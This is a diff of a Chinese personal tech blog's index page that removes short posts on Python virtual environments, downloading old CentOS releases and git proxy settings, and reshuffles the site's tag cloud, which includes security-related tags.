-<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-09-15-python-%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/image-20200915125628527.png" alt="image-20200915125628527"></p>
-<p>之后就可以使用系统环境变量的python了</p>
-<h2 id="虚拟环境删除"><a href="#虚拟环境删除" class="headerlink" title="虚拟环境删除"></a>虚拟环境删除</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="literal">-m</span> rmvirtualenv ENV</span><br></pre></td></tr></table></figure>
-
-<h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><p>建立一个bat文件，用来一键打开虚拟环境</p>
-<p>(待续)</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/15/python-%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-旧版本CentOS下载" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/15/%E6%97%A7%E7%89%88%E6%9C%ACCentOS%E4%B8%8B%E8%BD%BD/">旧版本CentOS下载</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/15/%E6%97%A7%E7%89%88%E6%9C%ACCentOS%E4%B8%8B%E8%BD%BD/" class="archive-article-date">
-  	<time datetime="2020-09-15T02:46:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="旧版本CentOS下载"><a href="#旧版本CentOS下载" class="headerlink" title="旧版本CentOS下载"></a>旧版本CentOS下载</h1><p>进入<a target="_blank" rel="noopener" href="https://www.centos.org/">centos官网</a>)，选择<a target="_blank" rel="noopener" href="https://www.centos.org/download/">Download</a></p>
-<p>![1 (1)](<a target="_blank" rel="noopener" href="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-09-15-%E6%97%A7%E7%89%88%E6%9C%ACCentOS%E4%B8%8B%E8%BD%BD/1">https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-09-15-旧版本CentOS下载/1</a> (1).png)</p>
-<p>下拉找到Older  Versions，点击“<a target="_blank" rel="noopener" href="http://wiki.centos.org/Download">then click here</a>”</p>
-<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-09-15-%E6%97%A7%E7%89%88%E6%9C%ACCentOS%E4%B8%8B%E8%BD%BD/2-1603336587098.png" alt="2"></p>
-<p>下拉到下面选择所需版本对应的”Tree“</p>
-<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-09-15-%E6%97%A7%E7%89%88%E6%9C%ACCentOS%E4%B8%8B%E8%BD%BD/3-1603336597481.png" alt="3"></p>
-<p>进入目录后选择“isos”目录</p>
-<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-09-15-%E6%97%A7%E7%89%88%E6%9C%ACCentOS%E4%B8%8B%E8%BD%BD/4-1603336604711.png" alt="4"></p>
-<p>选择系统版本，此处选择的是64位</p>
-<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-09-15-%E6%97%A7%E7%89%88%E6%9C%ACCentOS%E4%B8%8B%E8%BD%BD/5-1603336613355.png" alt="5"></p>
-<p>进入后依照需求选择镜像文件。</p>
-<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-09-15-%E6%97%A7%E7%89%88%E6%9C%ACCentOS%E4%B8%8B%E8%BD%BD/6-1603336625886.png" alt="6"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">CentOS</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/15/%E6%97%A7%E7%89%88%E6%9C%ACCentOS%E4%B8%8B%E8%BD%BD/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-git代理设置" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/04/git%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/">git代理设置</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/04/git%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/" class="archive-article-date">
-  	<time datetime="2020-09-04T07:07:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy 代理地址</span><br><span class="line">git config --global https.proxy 代理地址</span><br></pre></td></tr></table></figure>
-
-
-
-<p>例如</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://127.0.0.1:1080</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="取消代理"><a href="#取消代理" class="headerlink" title="取消代理"></a>取消代理</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure>
-
-<h1 id="查看代理"><a href="#查看代理" class="headerlink" title="查看代理"></a>查看代理</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --get http.proxy</span><br><span class="line">git config --global --get https.proxy</span><br></pre></td></tr></table></figure>
-
-<p>查询时没有任何输出，意味着没有设置代理</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">学习</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">GIT</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/04/git%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
     </nav>
   
 
@@ -1404,15 +1598,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">excel</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">学习</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">注册表</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">excel</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1440,19 +1634,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">BAT</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">CentOS</a>
+                <a href="javascript:void(0)" class="js-tag color4">BAT</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">奇奇怪怪的工具</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">CentOS</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1472,11 +1666,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">工具</a>
+                <a href="javascript:void(0)" class="js-tag color3">信息安全工程师，学习笔记</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">信息安全工程师，学习笔记</a>
+                <a href="javascript:void(0)" class="js-tag color3">工具</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1497,10 +1691,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">阿里云</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1528,15 +1718,43 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">正则表达式</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">内网，学习笔记，安全攻防</a>
+                <a href="javascript:void(0)" class="js-tag color3">其它</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">其它</a>
+                <a href="javascript:void(0)" class="js-tag color5">burp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">后渗透，Cobalt Strike</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">tool</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">信息收集</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">开发</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">内网，学习笔记，安全攻防</a>
               </li>
             
             <div class="clearfix"></div>
